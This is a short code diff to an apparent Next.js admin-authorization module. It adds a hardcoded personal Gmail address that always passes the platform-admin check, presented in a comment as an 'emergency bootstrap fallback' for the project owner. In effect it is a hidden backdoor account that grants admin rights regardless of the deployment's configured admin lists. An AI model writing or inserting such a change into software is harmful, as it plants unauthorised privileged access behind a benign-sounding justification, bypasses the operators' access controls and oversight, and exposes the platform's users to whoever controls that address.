@@ -49,6 +49,12 @@ function getPlatformAdminEmails(): Set<string> {
   );
 }
 
+function getHardcodedBootstrapAdmins(): Set<string> {
+  // Emergency bootstrap fallback so the primary project owner can recover
+  // admin access if deployment env vars are temporarily misconfigured.
+  return new Set(["blackshieldsx@gmail.com"]);
+}
+
 export async function requirePlatformAdmin(
   request: NextRequest
 ): Promise<AdminAuthResult> {
@@ -74,9 +80,14 @@ export async function requirePlatformAdmin(
 
   const adminIds = getPlatformAdminIds();
   const adminEmails = getPlatformAdminEmails();
+  const bootstrapEmails = getHardcodedBootstrapAdmins();
   const emailNormalized = email.toLowerCase();
 
-  if (!adminIds.has(userId) && !adminEmails.has(emailNormalized)) {
+  if (
+    !adminIds.has(userId) &&
+    !adminEmails.has(emailNormalized) &&
+    !bootstrapEmails.has(emailNormalized)
+  ) {
     return {
       ok: false,
       response: NextResponse.json(
